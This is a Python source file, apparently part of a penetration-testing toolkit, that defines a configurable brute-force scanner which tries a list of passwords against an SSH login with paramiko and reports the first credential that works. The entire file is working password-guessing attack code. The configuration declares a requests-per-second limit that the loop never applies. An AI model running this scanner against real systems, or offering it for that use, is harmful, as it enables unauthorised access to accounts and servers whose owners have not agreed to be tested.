import asyncio
import logging
from typing import Dict, List, Optional
from dataclasses import dataclass
import paramiko

@dataclass
class BruteForceConfig:
    """Configuration for brute force attacks"""
    target_type: str  # ssh, ftp, web
    target_host: str
    username: str
    password_list: List[str]
    port: int = 22
    timeout: int = 3
    max_attempts: int = 100
    requests_per_second: float = 1.0

class BruteForceScanner:
    def __init__(self, config: BruteForceConfig):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
    async def scan(self) -> Dict:
        if self.config.target_type == 'ssh':
            return await self._ssh_brute_force()
        else:
            raise ValueError(f"Unsupported target type: {self.config.target_type}")
            
    async def _ssh_brute_force(self) -> Dict:
        results = []
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for password in self.config.password_list[:self.config.max_attempts]:
            try:
                ssh.connect(
                    self.config.target_host,
                    port=self.config.port,
                    username=self.config.username,
                    password=password,
                    timeout=self.config.timeout
                )
                results.append({
                    'type': 'credential_found',
                    'username': self.config.username,
                    'password': password
                })
                break
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                self.logger.error(f"SSH connection error: {str(e)}")
                break
                
        return {'findings': results} 